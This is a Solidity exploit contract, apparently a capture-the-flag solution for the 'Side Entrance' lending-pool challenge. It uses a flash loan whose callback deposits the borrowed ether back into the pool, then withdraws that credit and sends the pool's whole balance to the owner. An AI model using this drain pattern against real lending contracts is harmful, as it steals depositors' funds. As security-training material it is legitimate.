//SPDX-License-Identifier:MIT
pragma solidity ^0.8.16;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import "@solmate/src/auth/Owned.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Attacker is IFlashLoanEtherReceiver, Owned {
    SideEntranceLenderPool private s_pool;

    function execute() external payable override {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    //constructor cant be recall because the bytecode is not deployed and this contract cant be detected by other contract
    // constructor(SideEntranceLenderPool pool) payable {
    //     uint256 balance = address(pool).balance;
    //     pool.flashLoan(balance);
    //     pool.withdraw();
    //     payable(msg.sender).transfer(address(this).balance);
    // }
    constructor(SideEntranceLenderPool pool) Owned(msg.sender) {
        s_pool = pool;
    }

    function attack() public onlyOwner {
        uint256 balance = address(s_pool).balance;
        s_pool.flashLoan(balance);
        s_pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
